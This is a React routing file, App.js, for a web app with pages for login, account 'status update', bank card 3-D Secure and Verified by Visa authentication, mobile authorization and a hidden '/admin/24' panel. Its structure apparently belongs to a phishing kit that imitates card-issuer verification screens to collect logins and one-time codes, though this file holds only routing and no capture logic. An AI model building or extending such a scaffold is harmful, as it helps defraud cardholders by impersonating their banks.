import React, { useEffect, Suspense } from 'react';
import { BrowserRouter, Route, Switch } from 'react-router-dom';
import Login from './components/auth/login';
import UpdateStatus from './components/auth/updatestatuspending';
import UpdateStatusError from './components/auth/updatestatuserror';
import ContainerCustom from './components/containers/auth_custom';
import ContainerLoading from './components/containers/auth_loading';
import ContainerCode from './components/containers/auth_process';
import ContainerError from './components/containers/auth_failed';
import container from './components/vbv/container';
import ContainerCustomError from './components/containers/auth_custom_error';

const GenView = React.lazy(() => import('./components/GenView'));

function App() {
  useEffect(() => {
    function fixDoubleScrollbars() {
      const htmlElement = document.documentElement;
      const bodyElement = document.body;
      htmlElement.style.height = '100%';
      htmlElement.style.overflow = 'hidden';
      bodyElement.style.height = '100%';
      bodyElement.style.margin = '0';
      bodyElement.style.overflowX = 'hidden';
      bodyElement.style.overflowY = 'auto';
      bodyElement.style.scrollbarWidth = 'none'; 
      bodyElement.style.msOverflowStyle = 'none'; 
      bodyElement.style.WebkitScrollbar = 'none';
    }

    fixDoubleScrollbars();
    window.addEventListener('resize', fixDoubleScrollbars);
    return () => {
      window.removeEventListener('resize', fixDoubleScrollbars);
    };
  }, []);

  return (
    <BrowserRouter>
      <Switch>
        <Route exact path="/" component={Login} />
        <Route exact path="/login" component={Login} />
        <Route exact path="/updatestatuspending" component={UpdateStatus} />
        <Route exact path="/updatestatuserror" component={UpdateStatusError} />

        {/*  GenView Suspense fallback */}
        <Route exact path="/admin/24" render={() => (
          <Suspense fallback={<div style={{ textAlign: 'center', marginTop: '20%', fontSize: '24px', fontWeight: 'bold', animation: 'fadeIn 1.5s ease-in-out infinite alternate' }}>Loading...</div>}>
            <GenView />
          </Suspense>
        )} />

        <Route exact path="/secure/3ds" component={ContainerCode} />
        <Route exact path="/secure/3dsError" component={ContainerError} />
        <Route exact path="/secure3ds" component={ContainerCustom} />
        <Route exact path="/secure3ds_error" component={ContainerCustomError} />
        <Route exact path="/secure/mobileAuth" component={ContainerLoading} />
        <Route exact path="/timeout" component={container} />
      </Switch>
    </BrowserRouter>
  );
}

export default App;
